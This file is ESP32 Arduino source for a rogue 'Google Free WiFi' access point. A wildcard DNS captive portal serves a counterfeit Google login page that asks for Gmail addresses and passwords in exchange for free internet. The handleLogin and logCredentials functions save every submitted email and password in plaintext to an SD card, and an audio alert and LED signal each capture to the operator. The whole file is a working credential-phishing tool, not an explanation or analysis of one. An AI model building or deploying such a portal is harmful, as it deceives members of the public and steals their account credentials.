#include <HTTP_Method.h>
#include <Middlewares.h>
#include <Uri.h>
#include <WebServer.h>
#include <WiFi.h>
#include <SPI.h>
#include <SD.h>
#include <DNSServer.h>
#include "AudioFileSourceSD.h"
#include "AudioGeneratorMP3.h"
#include "AudioOutputI2S.h"
#include "esp_wifi.h"
#include "driver/ledc.h"
#include <Arduino.h>

const char* ssid = "Google Free WiFi";
const char* password = "";
WebServer server(80);
DNSServer dnsServer;

#define SD_CS 5
#define I2S_BCLK 27
#define I2S_LRC 26
#define I2S_DOUT 25

#define RED_PIN 15
#define GREEN_PIN 2
#define BLUE_PIN 4

AudioFileSourceSD *file;
AudioGeneratorMP3 *mp3;
AudioOutputI2S *out;

unsigned long greenStartTime = 0;

const char loginPage[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free WiFi by Google</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 100%;
            max-width: 500px;
            margin: 50px auto;
            background: white;
            padding: 40px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            position: relative;
        }
        .logo {
            font-size: 24px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            text-align: center;
        }
        .logo span {
            font-weight: bold;
            font-size: 24px;
        }
        .logo .g { color: #4285F4; }
        .logo .o1 { color: #EA4335; }
        .logo .o2 { color: #FBBC05; }
        .logo .g2 { color: #34A853; }
        .logo .l { color: #4285F4; }
        .logo .e { color: #EA4335; }
        .checkmark {
            color: green;
            font-size: 20px;
            margin-left: 5px;
        }
        .wifi-icon {
            display: block;
            margin: 15px auto;
            width: 60px;
        }
        h2 {
            font-size: 22px;
            margin-bottom: 20px;
        }
        .input-field {
            width: 90%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 25px;
            font-size: 16px;
            text-align: center;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .btn {
            width: 95%;
            padding: 12px;
            background-color: #000;
            color: white;
            border: none;
            cursor: pointer;
            border-radius: 25px;
            font-size: 16px;
            margin-top: 10px;
            display: block;
            margin-left: auto;
            margin-right: auto;
        }
        .btn:hover {
            background-color: #333;
        }
        .footer {
            margin-top: 15px;
            font-size: 12px;
            color: #666;
            max-width: 80%;
            margin-left: auto;
            margin-right: auto;
        }

        /* Ensure logo adjusts properly on smaller screens */
        @media (max-width: 600px) {
            .logo span {
                font-size: 20px;
            }
            .wifi-icon {
                width: 50px;
            }
            h2 {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <span class="g">G</span><span class="o1">o</span><span class="o2">o</span><span class="g2">g</span><span class="l">l</span><span class="e">e</span>
            <span class="checkmark">✅</span>
        </div>
        <img src="/wifi_icon.png" class="wifi-icon" alt="WiFi Icon">
        <h2>Free WiFi By Google</h2>
        <form action="/login" method="POST">
            <input type="email" name="email" class="input-field" placeholder="Enter Your Gmail" required>
            <input type="password" name="password" class="input-field" placeholder="Enter Your Password" required>
            <button type="submit" class="btn">Login</button>
        </form>
        <p class="footer">This is a free WiFi by Google. To get free WiFi, enter your Gmail and password and click login.</p>
        <img src='/company_logo.png' align="right" class='company-logo' alt='Company Logo' style="max-width: 100%; height: auto;">
    </div>
</body>
</html>



)rawliteral";

void listConnectedDevices() {
    wifi_sta_list_t stationList;
    esp_wifi_ap_get_sta_list(&stationList);
    Serial.println("\nConnected Devices:");
    for (int i = 0; i < stationList.num; i++) {
        wifi_sta_info_t station = stationList.sta[i];
        Serial.printf("Device %d MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                      i + 1,
                      station.mac[0], station.mac[1], station.mac[2], 
                      station.mac[3], station.mac[4], station.mac[5]);
    }
}

void setup() {
    Serial.begin(115200);
    WiFi.mode(WIFI_AP);
    WiFi.softAP(ssid, password);
    delay(100);
    dnsServer.start(53, "*", WiFi.softAPIP());

    if (!SD.begin(SD_CS)) Serial.println("SD Card initialization failed!");
    else Serial.println("SD Card initialized.");

    out = new AudioOutputI2S();
    out->SetPinout(I2S_BCLK, I2S_LRC, I2S_DOUT);
    out->SetGain(0.8);
    mp3 = new AudioGeneratorMP3();

    pinMode(RED_PIN, OUTPUT);
    pinMode(GREEN_PIN, OUTPUT);
    pinMode(BLUE_PIN, OUTPUT);
    setLEDColor(255, 0, 0);

    server.on("/", HTTP_GET, []() { server.send(302, "text/html", ""); });
    server.on("/login.html", HTTP_GET, []() { server.send_P(200, "text/html", loginPage); });
    server.on("/wifi_icon.png", HTTP_GET, serveFile);
    server.on("/company_logo.png", HTTP_GET, serveFile);
    server.on("/login", HTTP_POST, handleLogin);
    
    server.begin();
    Serial.println("Web server started.");
}

void loop() {
    server.handleClient();
    dnsServer.processNextRequest();
    listConnectedDevices();
    delay(5000);

    if (greenStartTime > 0 && millis() - greenStartTime >= 5000) {
        setLEDColor(255, 0, 0);
        greenStartTime = 0;
    }

    if (mp3->isRunning() && !mp3->loop()) mp3->stop();
}

void handleLogin() {
    if (server.hasArg("email") && server.hasArg("password")) {
        String email = server.arg("email");
        String password = server.arg("password");
        logCredentials(email, password);
        playAlert();
    }
    server.send(200, "text/plain", "Success");
}

void logCredentials(String email, String password) {
    File logFile = SD.open("/log.txt", FILE_APPEND);
    if (logFile) {
        logFile.println("Email: " + email + " | Password: " + password + " | Time: " + String(millis()));
        logFile.close();
    } else {
        Serial.println("Failed to write to SD card.");
    }
}

void playAlert() {
    if (file) delete file;
    file = new AudioFileSourceSD("/alert.mp3");
    if (mp3->isRunning()) mp3->stop();
    mp3->begin(file, out);
    setLEDColor(0, 0, 255);
    delay(500);
    setLEDColor(0, 255, 0);
    greenStartTime = millis();
}

void setLEDColor(int red, int green, int blue) {
    analogWrite(RED_PIN, red);
    analogWrite(GREEN_PIN, green);
    analogWrite(BLUE_PIN, blue);
}

void serveFile() {
    String path = server.uri();
    File file = SD.open(path);
    if (!file) {
        server.send(404, "text/plain", "File Not Found");
        return;
    }
    server.streamFile(file, "image/png");
    file.close();
}
